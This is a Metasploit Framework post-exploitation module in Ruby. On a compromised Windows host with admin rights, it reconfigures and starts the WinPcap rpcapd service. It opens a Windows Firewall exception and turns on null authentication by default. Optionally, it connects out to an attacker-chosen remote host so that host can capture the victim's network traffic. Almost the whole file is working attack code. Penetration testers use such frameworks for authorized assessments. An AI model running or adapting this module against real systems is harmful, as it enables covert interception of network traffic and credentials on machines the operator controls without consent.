##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Post

	include Msf::Post::File
	include Msf::Post::Windows::Registry
	include Msf::Post::Windows::WindowsServices
	include Msf::Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Remote Packet Capture Service Starter',
      'Description'   => %q{
          This module enables the Remote Packet Capture System (rpcapd service)
        included in the default installation of Winpcap. The module allows you to set up
        the service in passive or active mode (useful if the client is behind a firewall).
        If authentication is enabled you need a local user account to capture traffic.
        PORT will be used depending of the mode configured.},
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
      'Platform'      => [ 'windows' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptBool.new('NULLAUTH', [ true, 'Enable Null Authentication.', true]),
        OptBool.new('ACTIVE',   [ true, 'Enable rpcapd in active mode (passive by default).', false]),
        OptAddress.new('RHOST',	 [ false, 'Remote host to connect (set in active mode only).']),
        OptInt.new('PORT',    [ true,  'Local/Remote port to capture traffic.',2002])
      ], self.class)
  end

  def run
    if is_admin?
      serv = service_info("rpcapd")
      print_status("Checking if machine #{sysinfo['Computer']} has rpcapd service")

      if serv['Name'] !~ /remote/i
        print_error("This machine doesn't seem to have the rpcapd service")
      else
        print_status("Rpcap service found: #{serv['Name']}")
        reg=registry_getvaldata("HKLM\\SYSTEM\\CurrentControlSet\\Services\\rpcapd","Start")
        prog=expand_path("%ProgramFiles%") << "\\winpcap\\rpcapd.exe"
        if reg != 2
          print_status("Setting rpcapd as 'auto' service")
          service_change_startup("rpcapd","auto")
        end
        if datastore['ACTIVE']==true
          if datastore['RHOST']==nil
            print_error("RHOST is not set ")
            return
          else
            p = prog << " -d -a #{datastore['RHOST']},#{datastore['PORT']} -v "
            print_status("Installing rpcap in ACTIVE mode (remote port: #{datastore['PORT']})")
          end
        else
          fw_enable(prog)
          print_status("Installing rpcap in PASSIVE mode (local port: #{datastore['PORT']}) ")
          p = prog << " -d -p #{datastore['PORT']} "
        end
        if datastore['NULLAUTH']==true
          p<< "-n"
        end
        run_rpcapd(p)
      end
    else
      print_error("You don't have enough privileges. Try getsystem.")
    end
  end

  def run_rpcapd(p)
    begin
      cmd_exec("sc","config rpcapd binpath= \"#{p}\" ",30)
      result=service_start("rpcapd")
      case result
        when 0
          print_good("Rpcapd started successfully: #{p}")
        when 1
          print_status("Rpcapd is already running. Restarting service ...")
          if service_stop("rpcapd") and service_start("rpcapd")
            print_good("Service restarted successfully: #{p}")
          else
            print_error("There was an error restarting rpcapd.exe. Try to run it again")
          end
      end
    rescue::Exception => e
      print_status("The following Error was encountered: #{e.class} #{e}")
    end
  end

  def fw_enable(prog)
    print_status ("Enabling rpcapd.exe in Windows Firewall")
    begin
      if file_exist?(prog)
        cmd_exec("netsh","firewall add allowedprogram \"#{prog}\" \"Windows Service\" ENABLE ",30)
      else
        print_error("rpcad.exe doesn't exist in #{prog}. Check the installation of WinPcap")
      end
    rescue::Exception => e
      print_status("The following Error was encountered: #{e.class} #{e}")
    end
  end
end
